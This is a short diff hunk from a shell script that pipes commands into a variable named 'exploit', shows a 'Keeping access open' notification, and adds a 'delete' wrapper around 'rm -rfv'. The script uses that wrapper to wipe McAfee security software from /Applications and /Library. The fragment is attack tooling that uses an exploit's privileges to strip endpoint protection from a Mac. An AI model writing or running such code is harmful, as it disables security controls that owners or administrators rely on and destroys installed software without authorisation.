@@ -36,6 +36,9 @@ osascript -e 'display notification "Keeping access open. Force quit when done." 
 "$exploit" <<EOF
 if [[ $elim == true ]]; then
 
+function delete {
+    rm -rfv "$@"
+}
 
         delete /Applications/McAfee* \
                /Library/McAfee* \
